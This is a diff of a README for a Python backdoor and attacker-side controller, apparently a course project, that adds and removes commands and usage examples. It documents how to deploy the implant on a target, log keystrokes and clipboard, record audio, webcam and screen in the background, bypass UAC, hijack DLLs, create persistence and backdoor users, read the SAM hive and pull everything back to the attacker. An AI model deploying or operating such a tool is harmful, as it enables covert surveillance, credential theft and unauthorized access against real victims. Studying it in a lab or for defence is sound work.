@@ -76,13 +76,14 @@ Attacker_Machine/
 - Logs keystrokes to file with timestamps
 - **Auto-download feature**: `keylog_dump` automatically downloads log file to attacker machine
 - Works with or without external libraries (fallback mode)
+- Manual text logging for fallback mode
 - Downloaded as: `keylog_dump_YYYYMMDD_HHMMSS.txt`
-- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`, `keylog_status`
+- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`, `keylog_status`, `keylog_manual`
 
 ### 2. **Privilege Escalation** 🔐
 
 - Check current privilege level
-- Enumerate SUID binaries (Linux/macOS)
+- Enumerate Windows privilege escalation vectors
 - Find sudo opportunities
 - Discover writable system paths
 - List running services
@@ -91,25 +92,31 @@ Attacker_Machine/
 - Find weak file permissions
 - Windows UAC bypass attempts
 - DLL hijacking opportunities (Windows)
-- Docker-based privilege escalation
 - Create persistence mechanisms
 - Create backdoor user accounts
-- Plant SSH keys for persistent access
-- Sudo exploitation with password
+- Read admin-protected files with elevation attempts
+- Read binary files with base64 encoding
+- List admin-protected directory contents
 - Comprehensive escalation scanning
-- Commands: `priv_check`, `priv_enum`, `priv_scan`, `priv_services`, `priv_tasks`, `priv_sensitive`, `priv_weak_perms`, `priv_uac_bypass`, `priv_dll_hijack`, `priv_docker`, `priv_persist`, `priv_user`, `priv_ssh_key`, `priv_sudo`
+- Commands: `priv_check`, `priv_enum`, `priv_scan`, `priv_services`, `priv_tasks`, `priv_sensitive`, `priv_weak_perms`, `priv_uac_bypass`, `priv_dll_hijack`, `priv_persist`, `priv_user`, `priv_read_file`, `priv_read_binary`, `priv_list_dir`
 
 ### 3. **Screen & Media Capture** 📸
 
 - **Screenshot capture**: Single or multiple screenshots
 - **Audio recording**: Record from microphone
-- **Webcam capture**: Capture images from webcam
-- **Screen recording** (NEW): Record screen video with configurable FPS
+  - Background recording: `audio_start`, `audio_stop`
+  - Timed recording: `audio_record <duration>`
+  - Status monitoring: `audio_status`
+- **Webcam capture**: Capture images and video from webcam
+  - Background recording: `webcam_start`, `webcam_stop`
+  - Single image capture: `webcam_snap`
+  - Status monitoring: `webcam_status`
+- **Screen recording**: Record screen video with configurable FPS
   - Timed recording: `record_screen <duration> <fps>`
   - Background recording: `record_start`, `record_stop`
   - Multiple recording methods (OpenCV, MSS, ffmpeg)
 - Multiple fallback methods for compatibility
-- Commands: `screenshot`, `screenshot_multi`, `audio_record`, `webcam_snap`, `record_screen`, `record_start`, `record_stop`, `record_list`
+- Commands: `screenshot`, `screenshot_multi`, `screenshot_list`, `audio_record`, `audio_start`, `audio_stop`, `audio_status`, `audio_list`, `webcam_snap`, `webcam_start`, `webcam_stop`, `webcam_status`, `webcam_list`, `record_screen`, `record_start`, `record_stop`, `record_status`, `record_list`
 
 ### 4. **Network Discovery** 🌐
 
@@ -129,10 +136,10 @@ Attacker_Machine/
 - Logs clipboard content with timestamps
 - Manual clipboard retrieval
 - Remote clipboard manipulation
+- Status monitoring
 - **Auto-download feature**: `clipboard_dump` downloads log file to attacker
 - Downloaded as: `clipboard_dump_YYYYMMDD_HHMMSS.txt`
-- Commands: `clipboard_start`, `clipboard_stop`, `clipboard_get`, `clipboard_set`, `clipboard_dump`, `clipboard_clear`, `clipboard_list`
-- See [CLIPBOARD_GUIDE.md](CLIPBOARD_GUIDE.md) for detailed documentation
+- Commands: `clipboard_start`, `clipboard_stop`, `clipboard_status`, `clipboard_get`, `clipboard_set`, `clipboard_dump`, `clipboard_clear`, `clipboard_list`
 
 ### 6. **File Operations** 📁
 
@@ -208,7 +215,9 @@ Attacker_Machine/
    scp -r DES484_Backdoor user@target:/tmp/
    ```
 
-2. **Install optional dependencies:**
+   Or, download the project directly on the target machine using a web browser, HTTP file import, or Google Drive link, depending on the attacker's preferred method.
+
+2. **Install required dependencies:**
 
    ```bash
    cd /tmp/DES484_Backdoor
@@ -227,35 +236,6 @@ Attacker_Machine/
    ```bash
    python3 backdoor.py
    ```
-
-#### Method 2: Minimal Deployment (Stealth Mode)
-
-**For environments without external libraries:**
-
-1. **Copy only necessary files:**
-
-   ```bash
-   # Copy backdoor.py and features/ directory
-   scp -r backdoor.py features/ user@target:/tmp/backdoor/
-   ```
-
-2. **Run without dependencies:**
-
-   ```bash
-   cd /tmp/backdoor
-   python3 backdoor.py
-   ```
-
-   The backdoor will use fallback methods (system commands) for all features.
-
-#### Method 3: Single-File Deployment (Advanced)
-
-**For minimal footprint**, you can embed the features into `backdoor.py` or use only basic features:
-
-```bash
-# Edit backdoor.py to disable features if imports fail
-python3 backdoor.py
-```
 
 ## 📖 Usage Guide
 
@@ -364,20 +344,23 @@ priv_uac_bypass
 # Find DLL hijacking opportunities (Windows only)
 priv_dll_hijack
 
-# Docker-based escalation
-priv_docker
-
 # Create persistence mechanism
 priv_persist
+
+# Create persistence at specific path
+priv_persist C:\Windows\Temp\backdoor.exe
 
 # Create backdoor user (requires admin/root)
 priv_user hacker SecurePass123
 
-# Plant SSH key for persistent access
-priv_ssh_key "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA..."
+# Read admin-protected file
+priv_read_file C:\Windows\System32\config\SAM
 
-# Attempt sudo escalation with password
-priv_sudo UserPassword123
+# Read binary file (returns base64)
+priv_read_binary C:\Windows\System32\cmd.exe
+
+# List admin-protected directory
+priv_list_dir C:\Windows\System32\config
 ```
 
 #### Screen Capture
@@ -408,6 +391,9 @@ record_screen 30 30
 # Start background recording (max 1 hour)
 record_start
 
+# Start background recording with custom max duration (600 seconds)
+record_start 600
+
 # Check recording status
 record_status
 
@@ -427,14 +413,36 @@ download logs/recordings/screen_recording_20241004_143022.mp4
 # Record audio for 10 seconds
 audio_record 10
 
+# Start background audio recording
+audio_start
+
+# Check audio recording status
+audio_status
+
+# Stop background audio recording
+audio_stop
+
 # List recordings
 audio_list
 
 # Capture webcam image
 webcam_snap
 
+# Start background webcam recording
+webcam_start
+
+# Check webcam recording status
+webcam_status
+
+# Stop background webcam recording
+webcam_stop
+
+# List webcam captures
+webcam_list
+
 # Download recordings
 download logs/audio/audio_20241002_143530.wav
+download logs/webcam/webcam_20241002_143530.jpg
 ```
 
 #### Network Discovery
@@ -458,6 +466,124 @@ net_public_ip
 # Check internet connectivity
 net_check_internet
 ```
+
+#### Clipboard Stealer
+
+```bash
+# Start clipboard monitoring
+clipboard_start
+
+# Check clipboard monitoring status
+clipboard_status
+
+# Get current clipboard content
+clipboard_get
+
+# Set clipboard content
+clipboard_set "Your text here"
+
+# Download clipboard log (auto-downloads to attacker machine)
+clipboard_dump
+# File saved as: clipboard_dump_YYYYMMDD_HHMMSS.txt
+
+# List clipboard logs
+clipboard_list
+
+# Clear clipboard log on target
+clipboard_clear
+
+# Stop clipboard monitoring
+clipboard_stop
+```
+
+### All Commands
+
+| Category        | Command                     | Description                             |
+| --------------- | --------------------------- | --------------------------------------- |
+| **Help**        | `help`                      | Show all available commands             |
+| **System**      | `sysinfo`                   | Display system information              |
+|                 | `cd <dir>`                  | Change directory                        |
+| **Files**       | `download <file>`           | Download file from target               |
+|                 | `upload <file>`             | Upload file to target                   |
+| **Keylogger**   | `keylog_start`              | Start keystroke capture                 |
+|                 | `keylog_stop`               | Stop keylogger                          |
+|                 | `keylog_status`             | Show keylogger status                   |
+|                 | `keylog_dump`               | Download keylog file                    |
+|                 | `keylog_clear`              | Clear keylog file                       |
+|                 | `keylog_manual <text>`      | Manually log text (fallback mode)       |
+| **Screenshots** | `screenshot`                | Capture single screenshot               |
+|                 | `screenshot_multi <n> <i>`  | Multiple screenshots (n shots, i sec)   |
+|                 | `screenshot_list`           | List captured screenshots               |
+| **Recording**   | `record_screen <sec> <fps>` | Record screen (duration, fps)           |
+|                 | `record_start <max>`        | Start background screen recording       |
+|                 | `record_stop`               | Stop background recording               |
+|                 | `record_status`             | Show recording status                   |
+|                 | `record_list`               | List all recordings                     |
+| **Audio**       | `audio_record <sec>`        | Record audio for duration (default 10s) |
+|                 | `audio_start`               | Start background audio recording        |
+|                 | `audio_stop`                | Stop background audio recording         |
+|                 | `audio_status`              | Check audio recording status            |
+|                 | `audio_list`                | List audio recordings                   |
+| **Webcam**      | `webcam_snap`               | Capture webcam image                    |
+|                 | `webcam_start`              | Start background webcam recording       |
+|                 | `webcam_stop`               | Stop background webcam recording        |
+|                 | `webcam_status`             | Check webcam recording status           |
+|                 | `webcam_list`               | List webcam captures                    |
+| **Clipboard**   | `clipboard_start`           | Start clipboard monitoring              |
+|                 | `clipboard_stop`            | Stop clipboard monitoring               |
+|                 | `clipboard_status`          | Check clipboard monitor status          |
+|                 | `clipboard_get`             | Get current clipboard content           |
+|                 | `clipboard_set <text>`      | Set clipboard content                   |
+|                 | `clipboard_dump`            | Download clipboard log                  |
+|                 | `clipboard_clear`           | Clear clipboard log                     |
+|                 | `clipboard_list`            | List clipboard logs                     |
+| **Network**     | `net_info`                  | Network information                     |
+|                 | `net_scan`                  | Scan local network                      |
+|                 | `net_portscan <host>`       | Scan ports on remote host               |
+|                 | `net_connections`           | Show active network connections         |
+|                 | `net_public_ip`             | Get public IP address                   |
+|                 | `net_check_internet`        | Check internet connectivity             |
+| **Privileges**  | `priv_check`                | Check current privileges                |
+|                 | `priv_enum`                 | Find escalation vectors                 |
+|                 | `priv_scan`                 | Comprehensive escalation scan           |
+|                 | `priv_services`             | List running services                   |
+|                 | `priv_tasks`                | List scheduled tasks                    |
+|                 | `priv_sensitive`            | Find sensitive files                    |
+|                 | `priv_weak_perms`           | Find weak file permissions              |
+|                 | `priv_uac_bypass`           | UAC bypass (Windows)                    |
+|                 | `priv_dll_hijack`           | DLL hijacking (Windows)                 |
+|                 | `priv_persist <path>`       | Create persistence mechanism            |
+|                 | `priv_user <user> <pass>`   | Create backdoor user                    |
+|                 | `priv_read_file <path>`     | Read admin-protected file               |
+|                 | `priv_read_binary <path>`   | Read admin-protected binary (base64)    |
+|                 | `priv_list_dir <path>`      | List admin-protected directory          |
+| **Exit**        | `quit`                      | Close connection                        |
+
+### File Locations
+
+**On Target Machine:**
+
+- Keylogs: `logs/keylog/keylog.txt`
+- Clipboard logs: `logs/clipboard/clipboard.txt`
+- Screenshots: `logs/screenshots/`
+- Recordings: `logs/recordings/`
+- Audio: `logs/audio/`
+- Webcam: `logs/webcam/`
+
+**On Attacker Machine (where `server.py` runs):**
+
+- Downloaded keylogs: `keylog_dump_YYYYMMDD_HHMMSS.txt`
+- Downloaded clipboard logs: `clipboard_dump_YYYYMMDD_HHMMSS.txt`
+- Downloaded screenshots, recordings, audio, webcam captures:  
+   Saved in the same directory as `server.py` by default.  
+   If you use a path like `download logs/audio/filename.wav`, the file will be saved in `logs/audio/` on the attacker's side, matching the folder structure.
+
+  This applies to other features as well:  
+  For example, downloading screenshots with `download logs/screenshots/screenshot_xxx.png` will save the file in `logs/screenshots/` on the attacker's machine. The same applies for recordings, webcam captures, and clipboard logs—using the full path will preserve the folder structure when saving on the attacker's side.
+
+- All other downloads:  
+  Saved in the current working directory of the controller (`server.py`), using the same filename as on the target machine.  
+  For example, downloading a file like `secret.txt` from the target will save it as `secret.txt` in your current directory on the attacker's side.
 
 ## 🔧 Troubleshooting
 
@@ -618,51 +744,3 @@ All features are fully documented with practical examples and step-by-step instr
 ❌ Malicious purposes
 ❌ Violating privacy laws
 ❌ Without written authorization
-
-**Disclaimer:** The authors are not responsible for misuse of this tool. Users must comply with all applicable laws and ethical guidelines.
-
-## 🚀 Quick Reference
-
-### Essential Commands
-
-| Category        | Command                | Description                  |
-| --------------- | ---------------------- | ---------------------------- |
-| **Help**        | `help`                 | Show all available commands  |
-| **System**      | `sysinfo`              | Display system information   |
-|                 | `cd <dir>`             | Change directory             |
-| **Files**       | `download <file>`      | Download file from target    |
-|                 | `upload <file>`        | Upload file to target        |
-| **Keylogger**   | `keylog_start`         | Start keystroke capture      |
-|                 | `keylog_dump`          | Download keylog file         |
-|                 | `keylog_stop`          | Stop keylogger               |
-| **Screenshots** | `screenshot`           | Capture single screenshot    |
-|                 | `screenshot_multi 5 2` | Multiple screenshots         |
-| **Recording**   | `record_screen 30 15`  | Record screen (30s, 15fps)   |
-|                 | `record_start`         | Start background recording   |
-|                 | `record_stop`          | Stop recording               |
-| **Network**     | `net_info`             | Network information          |
-|                 | `net_scan`             | Scan local network           |
-| **Privileges**  | `priv_check`           | Check current privileges     |
-|                 | `priv_enum`            | Find escalation vectors      |
-|                 | `priv_scan`            | Comprehensive scan           |
-|                 | `priv_weak_perms`      | Find exploitable permissions |
-|                 | `priv_uac_bypass`      | UAC bypass (Windows)         |
-|                 | `priv_docker`          | Docker escalation            |
-|                 | `priv_persist`         | Create persistence           |
-|                 | `priv_user admin Pass` | Create backdoor user         |
-| **Exit**        | `quit`                 | Close connection             |
-
-### File Locations
-
-**On Target Machine:**
-
-- Keylogs: `logs/keylog/keylog.txt`
-- Screenshots: `logs/screenshots/`
-- Recordings: `logs/recordings/`
-- Audio: `logs/audio/`
-- Webcam: `logs/webcam/`
-
-**On Attacker Machine:**
-
-- Downloaded keylogs: `keylog_dump_YYYYMMDD_HHMMSS.txt`
-- Other downloads: Same directory as `server.py`
